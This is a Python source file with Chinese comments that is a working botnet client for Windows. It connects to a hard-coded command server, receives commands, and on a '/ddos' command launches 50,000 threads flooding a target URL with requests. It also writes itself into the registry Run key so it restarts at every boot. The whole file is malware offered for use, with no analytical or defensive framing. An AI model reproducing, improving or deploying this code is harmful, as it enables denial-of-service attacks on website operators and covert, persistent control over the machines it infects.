# 接收总攻信息 指哪打哪
import time
from socket import *
import threading
import requests
# 2.0
import winreg
import win32api
import win32con
import os
import sys

address = '192.168.1.101'
port = 5000
buffsize = 512

ddos_flag = False


# ddos攻击
def ddos(url):
    def go(url):
        global ddos_flag
        while True:
            if ddos_flag: return
            try:
                response = requests.get(url, headers={
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'})
                print('状态码:', response.status_code)
            except:
                pass

    print('攻击:', url)
    for i in range(50000): threading.Thread(target=go, args=(url,)).start()


# 执行指令
def execute(s):
    print('连接成功')
    while True:
        global ddos_flag
        try:
            recvdata = s.recv(buffsize).decode('utf-8')
            if recvdata.split('=')[0] == '/msg':
                print(recvdata.split('=')[1])
            elif recvdata == '/sotp_ddos':
                ddos_flag = True
            elif recvdata.split('_')[0] == '/ddos':
                ddos_flag = False
                threading.Thread(target=ddos, args=(recvdata.split("_")[1],)).start()

        except:
            print('出问题了断开客户端')
            connect()
            return


# 建立连接
def connect():
    try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((address, port))
        execute(s)
        return
    except:
        print('连接失败 将在一秒后重连')
        time.sleep(1)
        connect()


# 开机自启
def set_auto_run():
    def zhao():
        location = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        # 获取注册表该位置的所有键值
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location)
        i = 0
        while True:
            try:
                # 获取注册表对应位置的键和值
                # print(winreg.EnumValue(key, i)[0], winreg.EnumValue(key, i)[1])
                if winreg.EnumValue(key, i)[0] == os.path.basename(sys.argv[0]):
                    return True
                i += 1
            except OSError as error:
                # 一定要关闭这个键
                winreg.CloseKey(key)
                break

    flag = zhao()
    if flag:
        pass
    else:
        sys.setrecursionlimit(1000000)
        name = os.path.basename(sys.argv[0])
        path = os.getcwd() + '\\' + os.path.basename(sys.argv[0])
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                  win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)



if __name__ == '__main__':
    # time.sleep(10)  # 延时?秒后操作
    # 设置开机自启
    set_auto_run()
    # 启动服务
    connect()
